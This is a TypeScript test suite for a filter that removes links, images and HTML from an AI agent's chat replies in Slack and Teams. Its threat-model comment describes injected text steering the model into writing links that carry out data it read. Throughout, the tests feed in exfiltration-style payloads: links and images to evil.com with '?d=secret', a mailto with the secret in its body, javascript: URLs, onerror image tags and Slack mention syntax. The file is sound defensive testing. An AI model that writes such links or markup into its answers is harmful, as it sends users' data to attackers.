import { parseMarkdown } from "chat";
import type { Nodes } from "chat";
import { describe, expect, it } from "vite-plus/test";

import {
  inSlack,
  inTeams,
  streamedWithoutLinks,
  withoutLinks,
} from "../src/channels/without-links.ts";

// The agent's own words in a chat app without links or images
// (src/channels/without-links.ts), from its threat model: text the model
// read steers it into writing a link, an image or HTML, in any form
// Markdown, GFM or HTML takes, to lead the person anywhere or carry what
// it read out in an address something fetches. What makes a link or an
// image is taken out of the tree; an address written out stays words, the
// accepted residue (a platform may make it clickable, nothing fetches
// it); each platform's own link and mention syntax is taken out where the
// answer is posted. Whatever the parser can't take is cut whole.

/** Node types that make a link, an image or HTML. */
const linkingTypes: ReadonlySet<string> = new Set([
  "link",
  "linkReference",
  "image",
  "imageReference",
  "html",
  "definition",
  "footnoteDefinition",
]);

/**
 * What the parser still reads in `text` as a link, an image or HTML, but
 * an address written out: a link whose address is its own words.
 */
const linking = (text: string): string[] => {
  const found: string[] = [];
  const pending: Nodes[] = [parseMarkdown(text)];
  for (let node = pending.pop(); node !== undefined; node = pending.pop()) {
    const [words, ...more] = "children" in node ? node.children : [];
    const writtenOut =
      node.type === "link" &&
      words?.type === "text" &&
      more.length === 0 &&
      [words.value, `http://${words.value}`, `mailto:${words.value}`].includes(
        node.url
      );
    if (linkingTypes.has(node.type) && !writtenOut) {
      found.push(node.type);
    }
    if ("children" in node) {
      pending.push(...node.children);
    }
  }
  return found;
};

/** The characters `text` shows, its backslash escapes undone, pair by pair. */
const unescaped = (text = ""): string =>
  text.replaceAll(/\\(?<character>[!-/:-@[-`{-~])/gu, "$<character>");

/** Every link form CommonMark, GFM and HTML have for `to`, with `title`. */
const forms = (to: string, title: string): string[] => [
  `[label](${to}${title})`,
  `[label](<${to}>${title})`,
  `![label](${to}${title})`,
  `[![label](${to}${title})](${to})`,
  `[label][r]\n\n[r]: ${to}${title}`,
  `[label][]\n\n[label]: ${to}${title}`,
  `[label]\n\n[label]: ${to}${title}`,
  `![label][r]\n\n[r]: ${to}${title}`,
  `<${to}>`,
  `<a href="${to}">label</a>`,
  `<img src="${to}">`,
  `x[^1]\n\n[^1]: ${to}`,
  `[see ${to} now](https://x.evil.com${title})`,
];

/** `form` wherever a block or inline construct can hold it. */
const contexts = (form: string): string[] => [
  `Before ${form} after.`,
  `*Before ${form} after.*`,
  `**${form}**`,
  `# ${form}`,
  `- ${form}`,
  `> ${form}`,
  `| a |\n|---|\n| ${form} |`,
  `> - ${form}`,
];

/** A code block, which every generated answer ends with: it stays as written. */
const code = "```\n[b](https://evil.com/code)\n```";

describe("Stephen's own words in a chat app", () => {
  it("keep a link's words and an image's alt text, and lose HTML, definitions and footnotes", () => {
    const cases: [string, string][] = [
      ['See [the policy](https://evil.com "t") now.', "See the policy now."],
      [
        "See [a](https://evil.com 't'), [b](<https://evil.com/a b> (p)) and [c](https://evil.com (x)).",
        "See a, b and c.",
      ],
      [
        'Ref [foo][bar], collapsed [bar][], shortcut [bar].\n\n[bar]: https://evil.com "T"',
        "Ref foo, collapsed bar, shortcut bar.",
      ],
      ["> [q]: https://evil.com\n> quoted [q]", "> quoted q"],
      [
        "Image ![alt text](https://evil.com/i.png) and linked [![pic](https://evil.com/i.png)](https://evil.com).",
        "Image alt text and linked pic.",
      ],
      [
        'HTML <a href="https://evil.com/?d=secret">here</a> and <img src="https://evil.com/p.png"> end.',
        "HTML here and  end.",
      ],
      ["Block\n\n<img src=x onerror=1>", "Block"],
      ["Footnote[^1].\n\n[^1]: https://evil.com", "Footnote."],
      [
        "# Head [h](https://evil.com)\n\n- item [l](https://evil.com)\n\n| a | b |\n|---|---|\n| [c](https://evil.com) | d |",
        "# Head h\n\n- item l\n\n| a | b |\n| - | - |\n| c | d |",
      ],
      [
        'A note [doc](grasp:note/doc-1 "a quote"), [x](grasp:note/../evil) and [y](grasp:note/a?x=1) too.',
        "A note doc, x and y too.",
      ],
      [
        "[the site](https://evil.com) or <https://evil.com>",
        "the site or https://evil.com",
      ],
    ];
    expect(cases.map(([text]) => withoutLinks(text))).toStrictEqual(
      cases.map(([, cleaned]) => cleaned)
    );
  });

  it("keep an address written out as words, and ordinary answers byte for byte", () => {
    const words = [
      "Ask hr@acme.example, or see https://intranet.acme.example/leave and www.acme.example.",
      "Read README.md, run.py and the.team; e.g. this, end.Next and acme.com.",
      "Merci ! Le rapport est prêt : voyez-le.",
      "Steps:\n  1. Open the report\n      2. Check Q3",
      "Use snake_case names, C++ & C#, and 5 * 3 = 15. [brackets] stay.",
      "**Bold** and _em_ and ~~gone~~.\n\n* one\n* two\n  * nested\n\n1. first\n2. second",
      "| a | b |\n|---|---|\n| 1 | 2 |",
      "Run `npm i`, then:\n\n~~~ts\nconst x = [a](https://evil.com);\n~~~\n\n    indented [c](https://evil.com)",
      "Line one\nline two\\\nthree\r\nfour 😀",
      "Heading\n===\nText",
    ];
    expect(words.map(withoutLinks)).toStrictEqual(words);
  });

  it("leave no link, image or HTML of any CommonMark, GFM or HTML form, wherever it stands, and keep code as written", () => {
    const destinations = [
      "https://evil.com/s?d=secret",
      "HTTP://EVIL.COM/s",
      "//evil.com/s",
      "www.evil.com/s",
      "mailto:x@evil.com?body=secret",
      // oxlint-disable-next-line no-script-url -- a destination the model may be steered to write
      "javascript:alert(1)",
      "grasp:note/../evil",
      "https\\://evil.com/s",
      "&#104;ttps://evil.com/s",
    ];
    const titles = ["", ' "t"', " 't'", " (t)"];
    const left: string[] = [];
    let cases = 0;
    for (const to of destinations) {
      for (const title of titles) {
        for (const form of forms(to, title)) {
          for (const context of contexts(form)) {
            const text = `${context}\n\n${code}`;
            const cleaned = withoutLinks(text);
            cases += 1;
            const holds =
              linking(cleaned).length === 0 &&
              cleaned.endsWith(code) &&
              withoutLinks(cleaned) === cleaned;
            if (!holds) {
              left.push(
                `${JSON.stringify(text)} => ${JSON.stringify(cleaned)}`
              );
            }
          }
        }
      }
    }
    expect(cases).toBeGreaterThan(3000);
    expect(left).toStrictEqual([]);
  });

  it("leave no link, image or HTML in what the first review tried", () => {
    // Review of #2284, round 1: its probe inputs. An address written out
    // stays words (the accepted residue); none is a link or an image.
    const probes = [
      "xhttps://evil.com/?d=secret now",
      "see https\u200B://evil.com/x and ev\u200Bil.com/x and www\u200B.evil.com",
      "trailing dot evil.com./x and port evil.com:8080/x and user https://a@evil.example/x",
      "//evil.com/x and slack://open?team=T1 and tel:+31612345678 and javascript:alert(1)",
      "<@U12345> and <!here> and <!channel> and <#C12345> and <!subteam^S123>",
      "<https://evil.com|click here> and <evil.com|x> and <mailto:a@b.co|mail>",
      "split https:\n//evil.com/x and www.\nevil.com",
      "emph www.*evil*.com and htt**p**s://evil.com",
      `ref [a][r]\n\n${"x ".repeat(10)}\n\n[r]: https://evil.com`,
      "[a](https://evil.com\"t\") [b]( <https://evil.com> ) [c](https://evil.com 'x')",
      "[x]: <https://evil.com>\n[x]",
      "[![a](https://i.evil/i.png)](https://evil.com) ![b][r]\n\n[r]: https://evil.com/i.png",
      '<img src=x onerror=1> <a href="https://evil.com">w</a> <details><summary>s</summary>https://evil.com</details>',
      "&lt;https://evil.com&gt; &#x68;ttps://evil.com &amp;#104;ttps://evil.com",
      "> quote https://evil.com\n> - [x](https://y)",
      "| a | b |\n|---|---|\n| https://evil.com | [c](https://evil.com) |",
      "Heading\n===\n[a](https://evil.com)",
      "\\[a\\](https://evil.com) and [a]\\(https://evil.com)",
      "[a](javascript:alert(1)) and [c](grasp:note/abc?x=https://evil.com)",
      "word~~https://evil.com~~ and _https://evil.com_ and **https://evil.com**",
      "[a](<https://evil.com>)[b]",
    ];
    const kept = probes.map(withoutLinks);
    const shown = kept.map(withoutLinks);
    expect({
      linking: kept.flatMap(linking),
      shownLinking: shown.flatMap(linking),
      teamsLinkSyntax: shown.map(inTeams).filter((text) => text.includes("](")),
      slackControl: shown.map(inSlack).filter((text) => /[<>]/u.test(text)),
    }).toStrictEqual({
      linking: [],
      shownLinking: [],
      teamsLinkSyntax: [],
      slackControl: [],
    });
  });

  it("go to Slack with its control characters escaped and code in closed fences", () => {
    expect(
      [
        "Hey <!here>, <@U1> in <#C1>: <https://evil.com|click> & more > less.",
        "Code `<@U1>` and\n\n~~~js\nif (a < b && c) {}\n~~~",
        "```ts\nconst a = 1;\n```",
        "Open\n\n```\nnever closed <!here>",
      ].map(inSlack)
    ).toStrictEqual([
      "Hey &lt;!here&gt;, &lt;@U1&gt; in &lt;#C1&gt;: &lt;https://evil.com|click&gt; &amp; more &gt; less.",
      "Code `&lt;@U1&gt;` and\n\n```\nif (a &lt; b &amp;&amp; c) {}\n```",
      "```\nconst a = 1;\n```",
      "Open\n\n```\nnever closed &lt;!here&gt;\n```",
    ]);
  });

  it("go to Teams with the one link form its cards read broken wherever it stands", () => {
    expect(
      inTeams("Code `[a](https://evil.com)` and \\[b\\](https://evil.com).")
    ).toBe("Code `[a] (https://evil.com)` and \\[b\\] (https://evil.com).");
  });

  it("show a long ordinary answer as it is, or past the parser's bound as the same words in plain text, in time", () => {
    const longCode = `Here:\n\n\`\`\`py\n${Array.from(
      { length: 250 },
      (_, at) => `x_${at} = data["*"][${at}]  # ~${at}`
    ).join("\n")}\n\`\`\``;
    const spacedList = Array.from(
      { length: 130 },
      (_, at) => `- **Item ${at}**: _done_`
    ).join("\n\n");
    // With no blank line, one chunk: 780 and 1,208 of the characters the
    // parser takes time on, past the 256 a chunk may hold.
    const boldList = spacedList.replaceAll("\n\n", "\n");
    const table = `| **Name** | **State** |\n|---|---|\n${Array.from(
      { length: 200 },
      (_, at) => `| **Row ${at}** | _ok_ |`
    ).join("\n")}`;
    const started = performance.now();
    const [fenced, spaced, list, rows] = [
      longCode,
      spacedList,
      boldList,
      table,
    ].map(withoutLinks);
    const took = performance.now() - started;
    expect({
      fenced,
      spaced,
      list: [list === boldList, unescaped(list)],
      rows: [rows === table, unescaped(rows)],
      fast: took < 1000,
    }).toStrictEqual({
      fenced: longCode,
      spaced: spacedList,
      list: [false, boldList],
      rows: [false, table],
      fast: true,
    });
  });

  it("show a chunk the parser would take too long on as plain text, within its budget, and cut what it can't take at all", () => {
    const size = 64 * 1024;
    // What the parser takes longest on, in one chunk: labels nested as
    // deep as they go; a backslash before each `]` escaped itself; and
    // lines indented under one paragraph, which a hand-made reading of
    // its blocks took for blocks of their own.
    const shapes = {
      nested: `${"![".repeat(10_000)}a${"](https://evil.com)".repeat(10_000)}`,
      escapedBackslashes: "a\\\\]".repeat(size / 4),
      indentedItems: `start\n${Array.from({ length: 160 }, () => `    - ${"a]".repeat(200)}`).join("\n")}`,
      indentedFence: `start\n    \`\`\`\n${Array.from({ length: 160 }, () => `    ${"a]".repeat(200)}`).join("\n")}\n    \`\`\``,
    };
    const took: Record<string, boolean> = {};
    const plain: Record<string, boolean> = {};
    for (const [shape, text] of Object.entries(shapes)) {
      const started = performance.now();
      const cleaned = withoutLinks(text);
      // About 0.2 to 0.7 s each here, for 64 KB; slow runners take longer.
      took[shape] = performance.now() - started < 3000;
      plain[shape] =
        linking(cleaned).length === 0 &&
        unescaped(cleaned) === unescaped(text.trim());
    }
    const all = Object.fromEntries(
      Object.keys(shapes).map((key) => [key, true])
    );
    expect({
      took,
      plain,
      // Quotes nested past the parser's stack: cut whole.
      tooDeep: withoutLinks(`${">".repeat(20_000)} [a](https://evil.com)`),
    }).toStrictEqual({ took: all, plain: all, tooDeep: "" });
  });

  it("are the same when cleaned again, and hold no link, image or HTML outside code, whatever a thousand random answers hold", () => {
    const parts = [
      "[a](https://evil.com)",
      "    ",
      "\n",
      "\n\n",
      "<div>x</div>",
      "[b]: https://evil.com",
      "`c`",
      "```",
      "~~~",
      "> ",
      "- ",
      "1. ",
      "*",
      "_",
      "\\",
      "&#91;",
      "![i](https://evil.com/i)",
      "<!-- c -->",
      "word",
      " ",
      "\t",
      "[",
      "]",
      "(",
      ")",
      "<https://evil.com>",
      "|",
      "---",
      "#",
    ];
    // A fixed seed: the same thousands of answers every run.
    let seed = 7;
    const random = () => {
      seed = (seed * 1_103_515_245 + 12_345) % 2 ** 31;
      return seed / 2 ** 31;
    };
    const failed: string[] = [];
    for (let answer = 0; answer < 3000; answer += 1) {
      let text = "";
      const length = 1 + Math.floor(random() * 10);
      for (let part = 0; part < length; part += 1) {
        text += parts[Math.floor(random() * parts.length)];
      }
      const once = withoutLinks(text);
      if (withoutLinks(once) !== once || linking(once).length > 0) {
        failed.push(JSON.stringify(text));
      }
    }
    expect(failed).toStrictEqual([]);
  });

  it("are no link when the answer starts indented, nor when what is taken leaves an indented block first", () => {
    expect(
      [
        "    [x](https://evil.example/?d=1) more",
        "<div>cut</div>\n\n    [x](https://evil.example/?d=1)",
        "A <!-- note --> word",
        "[https://x.example](https://x.example) once",
      ].map(withoutLinks)
    ).toStrictEqual(["x more", "x", "A  word", "https://x.example once"]);
  });

  it("show of an answer being written, at every chunk's end, no link form, and never the address of a link, image or tag still open", () => {
    const answer = [
      'Leave lasts [sixteen weeks](https://evil.com/leave?d=secret "t") in all. ![chart](https://evil.com/c.png) and <a href="https://evil.com/a">the form</a>.',
      "See [the policy][p] and `[code](https://evil.com/code)`.",
      "[p]: https://evil.com/p",
    ].join("\n\n");
    const shown = Array.from({ length: answer.length + 1 }, (_, at) =>
      streamedWithoutLinks(answer.slice(0, at))
    );
    expect({
      linking: shown.flatMap(linking),
      teamsLinkSyntax: shown.filter((text) => inTeams(text).includes("](")),
      // Outside code, whose words stay as written.
      addresses: shown.filter((text) => /evil\.com\/(?!code)/u.test(text)),
      last: shown.at(-1),
    }).toStrictEqual({
      linking: [],
      teamsLinkSyntax: [],
      addresses: [],
      last: withoutLinks(answer),
    });
  });
});
